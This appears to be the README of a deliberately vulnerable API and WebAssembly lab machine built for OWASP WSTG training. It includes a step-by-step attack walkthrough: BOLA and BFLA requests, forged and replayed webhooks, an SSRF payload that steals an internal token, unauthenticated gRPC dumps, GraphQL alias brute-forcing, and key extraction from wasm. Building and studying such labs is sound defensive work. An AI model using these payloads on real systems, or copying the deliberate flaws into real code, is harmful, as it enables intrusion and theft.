# Machine 10 - API Testing & WebAssembly (`10-api-wasm`)

> **WARNING - INTENTIONALLY VULNERABLE.** This machine is a deliberately broken
> training target for **authorised security testing / training only**. Every
> weakness below is by design. Run it only on an isolated lab host, never
> expose it to untrusted networks, and never reuse its patterns in real code.
> All data is synthetic; all ports are bound to `127.0.0.1` only.

An "Acme" API platform: a REST API (Flask, v1 + undocumented v2), a GraphQL
endpoint (graphene), a plaintext gRPC inventory service with reflection, an
inbound-webhook receiver with an in-range mock payment provider, and a portal
that loads two real clang-built WebAssembly modules.

## WSTG coverage

| ID | Name | Severity |
|---|---|---|
| WSTG-APIT-01 | API Reconnaissance | medium |
| WSTG-APIT-02 | API Broken Object Level Authorization | high |
| WSTG-APIT-03 | Excessive Data Exposure | high |
| WSTG-APIT-04 | API Broken Function Level Authorization | critical |
| WSTG-APIT-09 | Inbound Webhooks | critical |
| WSTG-APIT-10 | gRPC | high |
| WSTG-APIT-99 | GraphQL | high |
| WSTG-WASM-01 | WebAssembly Reconnaissance | medium |

## Topology & ports (block 9000-9099)

| Port (loopback) | Service | Notes |
|---|---|---|
| `127.0.0.1:9000` | `front` (nginx) | Portal, `.wasm` modules, leaked C source; proxies `/api`, `/v1`, `/v2`, `/graphql`, `/webhooks`, `/debug`, `/openapi.json`, `/swagger`, `/.well-known` to `api` |
| `127.0.0.1:9010` | `grpc` | `lab.Inventory`, plaintext h2c, reflection on, no channel auth |
| `127.0.0.1:9020` | `provider` | In-range mock payment provider; signs events with HMAC-SHA256 |
| (not published) | `api` (Flask) | REST + GraphQL + webhook receiver, SQLite store |
| (not published) | `internal` | Metadata/secret service on the `internal: true` backend network - reachable **only** via SSRF from `api` |

Networks: `edge` (bridge) and `backend` (`internal: true`).

Seed accounts (synthetic): `alice` / `Password123!`, `bob` / `Password123!`,
`admin` / `Adm1nPassword!`. Users 1-3, orders 1-4, documents for alice and bob.

## Run

```sh
cd machines/10-api-wasm
docker compose config -q
docker compose up --build -d
```

## Verify (isolated venv)

```sh
python3 -m venv verify/.venv
verify/.venv/bin/pip install -r verify/requirements.txt
verify/.venv/bin/python ../../tools/runner.py machines/10-api-wasm
```

(`grpcio` + reflection are needed only by the gRPC probe; wasm parsing is
stdlib-only. Run the runner from the repo root or pass the machine path.
If PyPI downloads stall, add `-i https://pypi.tuna.tsinghua.edu.cn/simple`
to the pip command.)

## How to attack this

### WSTG-APIT-01 - API reconnaissance
The UI uses ~4 endpoints. Enumerate the real surface:
- `GET /openapi.json` and `/swagger/` - the *documented* v1 subset.
- `GET /debug/routes` - leftover Werkzeug route dump: every route, no auth.
- `GET /.well-known/api-catalog` - links the legacy collection.
- `GET /app.js` - a dev comment reveals `/api/legacy/orders?order_id=N`.
- `POST /graphql {"query":"{__schema{types{name}}}"}` - full GraphQL schema.

Then prove the hidden ones work: `GET /api/legacy/orders?order_id=2` returns
bob's order **plus his API token, unauthenticated**; `GET /v2/orders/1` (with
any bearer token) works but is absent from the spec.

### WSTG-APIT-02 - BOLA
Register two users A and B (`POST /api/auth/register`, then `/api/auth/login`
for bearer tokens). As B: `POST /v1/orders {"item":"x","amount":500}` and
`POST /api/documents {"title":"secret","content":"..."}`. As A:
- `GET /v1/orders/{B_order_id}` -> 200, B's order; `PUT` the same path with
  `{"status":"hacked"}` -> B's order is modified.
- `POST /v1/orders/update {"order_id":{B_order_id},"status":"pwn"}` - id in the
  **body**, same missing ownership check.
- `GET /api/users/{B_id}/documents` leaks document UUIDs; then
  `GET /api/documents/{uuid}` reads and `PUT /api/documents/{uuid}`
  `{"content":"rewritten"}` overwrites B's document.

### WSTG-APIT-03 - excessive data exposure
As alice: `GET /api/users`. The raw JSON contains every user's
`password_hash`, `api_token`, `ssn`, `internal_notes` - the UI (`app.js`)
merely maps to `{username, email}` client-side. `GET /v2/orders/{id}` embeds
the **full owner record**, including the password hash.

### WSTG-APIT-04 - BFLA
The "admin guard" matches `POST/PUT/DELETE` under `/api/admin/` only. As a
freshly registered normal user:
- `GET /api/admin/users` -> 200 full admin dump (method gap).
- `POST /api/admin/announce` -> 403 (the guard does fire here).
- `DELETE /v1/orders/{any_id}` -> 200, another user's order is gone (no role check).
- `POST /api/users/{own_id}/role {"role":"admin"}` -> `is_admin: 1` (path gap:
  role management lives outside `/api/admin/`).

### WSTG-APIT-09 - inbound webhooks
Capture a genuine signed event: `GET :9020/sample-event?account_id={id}&amount=10`
returns `body` + `signature` (`X-Provider-Signature`, HMAC-SHA256). Then POST to
`/webhooks/provider`:
1. **Forged**: change `amount` to `999999`, send signature `deadbeef...` ->
   accepted, balance becomes 999999 (`GET /api/me`).
2. **Replayed**: send the *same* genuine body+signature twice -> credited twice
   (no event_id/timestamp/idempotency check).
3. **Tampered identity**: set `account_id` to another user -> their balance grows.
4. **SSRF**: add `"callback_url":"http://internal:8080/latest/secret"` -> the
   receiver fetches the internal-only metadata service; read the stolen
   `internal_token` back via `GET /api/webhooks/events` (`callback_response`).

### WSTG-APIT-10 - gRPC
`grpcurl -plaintext 127.0.0.1:9010 list` (or the probe's Python reflection
client) enumerates `lab.Inventory` and fetches the `.proto` via reflection.
- `GetItem` without metadata -> `UNAUTHENTICATED` (needs `x-api-token: svc-token-alice`).
- `AdminDumpUsers` with **no credentials at all** -> all users' password hashes
  and API tokens. `AdminSetStock {"id":1,"stock":42}` -> unauthenticated write.
Everything runs over plaintext HTTP/2 - no TLS anywhere.

### WSTG-APIT-99 - GraphQL
All via `POST /graphql` (bearer token of a normal user):
- Introspection: `{__schema{queryType{name} mutationType{name} types{name}}}`.
- Field-level gap: `{ user(id: 2) { username passwordHash apiToken } }` -> bob's
  secrets to any caller.
- No depth limit: `{ order(id:1){ owner{ orders{ owner{ orders{ owner{ orders{
  owner{ username }}}}}}}}}` - 9 levels accepted.
- Alias rate-limit bypass: REST `/api/auth/login` locks out after 5 failures
  (429), but one mutation with `a0: login(...) a1: login(...) ... good:
  login(username:"...", password:"Password123!"){token}` runs 13 attempts in a
  single request and returns a valid token.
- `mutation { updateOrderStatus(orderId:{other_users_order}, status:"pwn"){...} }`
  skips ownership; `mutation { setUserRole(userId:{own_id}, isAdmin:true){...} }`
  skips the admin check.

### WSTG-WASM-01 - WebAssembly reconnaissance
`GET /app.js` shows `WebAssembly.instantiateStreaming(fetch("/license.wasm"))`
and a lazy-loaded module disguised as `/telemetry.bin`. Download both and parse
the binary (sections/exports/data segments):
- Custom sections: `name` (function names), `.debug_info` (DWARF), `producers`
  (identifies **clang** as the toolchain).
- Exports leak internal names: `validate_license`, `internal_license_checksum`,
  `get_api_key`, ...
- Data segments embed a live API key
  (`ak_wasm_9d41f0aa77c24e0bb1e6f3c2d8a45b17`), the internal metadata URL
  `http://internal:8080/latest/secret`, and a build flag.
- The original source is served at `/src/license.c` (and `/src/telemetry.c`) -
  the leak that makes every embedded string trivially readable.

## Reset

State lives in the `api` container's SQLite file and in-memory stores:
`docker compose down && docker compose up -d` restores the seed. Probes create
their own randomly-named users/objects and are safe to re-run.